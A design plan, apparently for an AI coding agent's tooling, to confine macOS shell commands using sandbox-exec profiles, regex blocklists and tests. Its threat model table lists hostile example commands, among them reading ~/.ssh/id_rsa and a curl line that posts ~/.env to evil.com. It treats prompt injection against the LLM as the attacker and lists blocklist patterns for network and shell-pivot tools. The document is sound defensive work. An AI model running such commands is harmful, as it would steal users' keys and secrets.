# macOS Run Sandbox Hardening Plan

## Current State

### What exists (all platforms)
- **Filesystem sandbox** (`sandbox.rs`): gates Read/Write/Edit/Glob/Search tool paths through `resolve_path()` — allowed roots, deny patterns, parent-dir rejection, unsafe char detection
- **Command blacklist** (`command_blacklist.rs`): regex-based catastrophic command denial (rm -rf /, fork bombs, dd device overwrite, mkfs, chmod -R /)
- **Env sanitizer**: strips sensitive env vars before passing to child process
- **`setsid()`**: child process gets its own session (can't signal Forge's process group)
- **`killpg(SIGKILL)`** on drop: entire process group killed when guard drops

### What exists (Windows only)
- **PowerShell constrained language mode**: restricts .NET type access, arbitrary code execution
- **Token blocklists**: process escape tokens (start-process, cmd, wsl, etc.) and network tokens (curl, wget, invoke-webrequest, etc.)
- **Job Object**: `KILL_ON_JOB_CLOSE` + UI restrictions (desktop, clipboard, global atoms, system parameters)

### What's missing on macOS
- No command token analysis — any shell builtin or binary runs unconstrained
- No filesystem confinement on the spawned process — `cd ~; cat ~/.ssh/id_rsa` works
- No network restriction on the spawned process
- No process escape detection (user's shell can launch any child)
- `setsid()` provides cleanup but zero confinement

## Threat Model (macOS-specific)

The attacker is a prompt injection or hallucinated tool call. The user has already approved the command (approval flow), so the hardening targets commands that *look* benign but contain injected payloads, or cases where the LLM fabricates dangerous commands.

| Threat | Example | Current mitigation |
|--------|---------|-------------------|
| Read files outside sandbox | `cat ~/.ssh/id_rsa` | None |
| Write files outside sandbox | `echo malicious > ~/.zshrc` | None |
| Navigate + operate outside sandbox | `cd /; find . -name '*.pem'` | None |
| Exfiltrate via network | `curl -X POST https://evil.com -d @~/.env` | None |
| Process escape / persistence | `nohup bash -c 'while true; do ...; done' &` | `killpg` on drop (partial) |
| Interpreter pivot | `python3 -c "import os; os.system('...')"` | None |

## Implementation Plan

### Phase 1: macOS sandbox-exec confinement (OS-level, highest value)

macOS provides `sandbox-exec` (Seatbelt) which enforces kernel-level sandbox profiles. This is the same mechanism App Store apps use.

**Approach**: Instead of executing `shell -c <command>`, execute `sandbox-exec -f <profile> shell -c <command>`. The profile is a generated Scheme file that:

- Allows read/write only within allowed sandbox roots + temp dirs
- Denies network access (configurable)
- Allows process execution (needed for cargo, git, etc.) but inherits the filesystem restrictions
- Denies file reads outside roots (closes `cat ~/.ssh/id_rsa`)

**File**: `engine/src/tools/macos_run.rs` (mirrors `windows_run.rs`)

**Profile generation**:
```scheme
(version 1)
(deny default)
(allow process-exec)
(allow process-fork)
(allow sysctl-read)
(allow mach-lookup)

;; Allow read/write within sandbox roots
(allow file-read* file-write*
  (subpath "/path/to/project")
  (subpath "/private/tmp"))

;; Allow read-only for toolchain paths
(allow file-read*
  (subpath "/usr")
  (subpath "/bin")
  (subpath "/Library")
  (subpath "/opt/homebrew")
  (subpath "/nix")
  (regex #"^/dev/")
  (regex #"^/private/var/folders/"))

;; Deny network (optional, configurable)
(deny network*)
```

**Mechanism/policy split**:
- `macos_run.rs` generates the profile from `Sandbox::allowed_roots()` and writes it to a tempfile
- Policy (enable/disable, network blocking, fallback) mirrors `WindowsRunSandboxPolicy` structure
- `prepare_run_command` on macOS returns a `PreparedRunCommand` that wraps the command with `sandbox-exec`

**Fallback**: `sandbox-exec` is deprecated by Apple but still functional through at least macOS 15. If unavailable, follow same fallback pattern as Windows (Prompt/Deny/AllowWithWarning).

### Phase 2: Unix token blocklist (parity with Windows)

**File**: Extend `command_blacklist.rs` or create `unix_run.rs`

Add regex patterns for:
- **Interpreter pivots**: `python[23]?\s+-c`, `ruby\s+-e`, `perl\s+-e`, `node\s+-e`, `lua\s+-e`
- **Process escape**: `nohup`, `disown`, `setsid` (the command, not syscall), `screen`, `tmux`
- **Network exfil**: `curl\s`, `wget\s`, `nc\s`, `ncat\s`, `socat\s`
- **Shell pivots**: `bash\s+-c`, `zsh\s+-c`, `sh\s+-c`, `fish\s+-c`

These are defense-in-depth behind Phase 1 (sandbox-exec is the actual enforcement). The token blocklist catches obvious cases for user feedback even when the kernel sandbox would also deny.

Note: same bypass weaknesses as Windows token matching (variable expansion, backtick equivalents). The kernel sandbox in Phase 1 is what makes this defensible — the blocklist provides early, readable error messages.

### Phase 3: Unified `prepare_run_command` dispatch

Refactor `prepare_run_command` to be a platform dispatch:
```
prepare_run_command
├── cfg(windows) → prepare_windows_run_command (existing)
├── cfg(target_os = "macos") → prepare_macos_run_command (new)
└── cfg(unix, not macos) → prepare_linux_run_command (future)
```

Currently the non-Windows path is a passthrough (`Ok(PreparedRunCommand::new(command, None, false))`). This becomes the macOS policy entry point.

### Phase 4 (future): Linux confinement

Linux options for equivalent confinement:
- **bwrap** (bubblewrap): user-namespace filesystem sandboxing, no root needed
- **seccomp-bpf**: syscall filtering (heavier to maintain)
- **landlock**: filesystem access control (kernel 5.13+, no root needed)

Landlock is the most promising for parity with macOS sandbox-exec — kernel-enforced, no privileged setup, filesystem-granular. But it's Linux 5.13+ only, so needs fallback detection.

## Config Surface

No new user-facing config. Reuse existing `[tools.sandbox]` config:
- `allowed_roots` → sandbox-exec `(subpath ...)` entries
- `denied_patterns` → additional deny rules in profile
- `allow_absolute` → whether absolute paths outside roots are permitted

The `RunSandboxPolicy` struct gains a `macos: MacOSRunSandboxPolicy` field (mirrors `windows`):
```rust
pub struct MacOSRunSandboxPolicy {
    pub enabled: bool,
    pub block_network: bool,
    pub fallback_mode: RunSandboxFallbackMode, // reuse existing enum
}
```

## Test Plan

| Test | Assertion |
|------|-----------|
| Read file inside sandbox root | Allowed |
| Read file outside sandbox root | Denied by sandbox-exec (EPERM) |
| Write file inside sandbox root | Allowed |
| Write file outside sandbox root | Denied |
| `cd ~ && ls` | Denied (can't read home if outside root) |
| `cargo build` (inside project) | Allowed (toolchain paths readable) |
| `curl` with network blocked | Denied |
| `sandbox-exec` unavailable + fallback=Prompt | Error with override instruction |
| `sandbox-exec` unavailable + fallback=Deny | Hard error |
| Profile generation with multiple roots | Correct `(subpath ...)` entries |
| Profile generation with special chars in path | Properly escaped |

## Risks

- **`sandbox-exec` deprecation**: Apple deprecated it but hasn't removed it. No replacement API exists for CLI use. If removed in a future macOS, fallback mode activates. Monitor yearly at WWDC.
- **Toolchain path allowlist maintenance**: Homebrew, nix, MacPorts all install to different prefixes. The read-only allowlist needs to cover common cases. Fallback: if a known build tool fails, the error message should suggest adding the path to `allowed_roots`.
- **Profile escaping**: Sandbox profile paths containing quotes or special Scheme characters need proper escaping. Must have tests for paths with spaces, quotes, unicode.
